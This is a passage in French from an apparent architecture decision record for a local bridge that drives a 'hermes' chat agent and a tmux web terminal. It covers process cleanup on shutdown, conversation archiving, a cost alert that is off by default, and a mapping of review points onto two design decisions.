- `os.killpg` seulement si `proc.poll() is None`, puis `wait()` après `SIGKILL`.
- À l'arrêt, le pont parcourt `/proc/*/stat` (PPID récursifs) et signale l'arbre des descendants avant le groupe.
- Test : un faux fils qui lance `setsid sleep 300` est mort 6 s après `messagerie.arreter`.

**S16 — Cohérence fonctionnelle.**
- (1) Archivage :
  - ajout de `POST /v1/actions/messagerie.archiver {conversation}`, qui déplace la conversation vers `messagerie/archive/` avec les mêmes règles de chemin ;
  - action « Archiver » dans la liste des conversations ;
  - pas de purge automatique, trop destructive.
- (2) `GET /v1/messagerie` ne lit que l'en-tête de chaque JSONL (ou un index reconstructible).
- (3) Alerte de coût dans `GET /v1/sante`, jamais un blocage. Le seuil `--alerte-cout-jour` est **désactivé par défaut** ; le propriétaire le fixera s'il le souhaite.
- (4) dev vérifie réellement que `hermes -p default chat …` fonctionne avant de figer l'argv dans les tests.

### Effet sur le corps de l'ADR

**Décision A :**
- garde-fou d'approbation et environnement du fils → S2 ;
- interlocuteurs → S8 ;
- lecture de la sortie et stderr → S9 ;
- garde-fous ajoutés : 4 runs simultanés et JSONL ≤ 5 Mio (S9), archivage (S16) ;
- nouvelle route : `messagerie.archiver`.

**Décision B :**
- tmux : `-S <dossier-du-pont>/terminal/tmux.sock` et `-f pont/hermes-os-terminal.tmux.conf` (S3, S4) ;
- jeton → S5 ;
- chemin du WebSocket → S1 ;
- durée de vie de la connexion → S6 ;
- bornes du WebSocket → S10 ;
- CSP → S12 ;
- unit → S13.

**R1 et T3 :** ajout du risque résiduel S4. L'acceptation du propriétaire est requise avant l'installation du terminal.
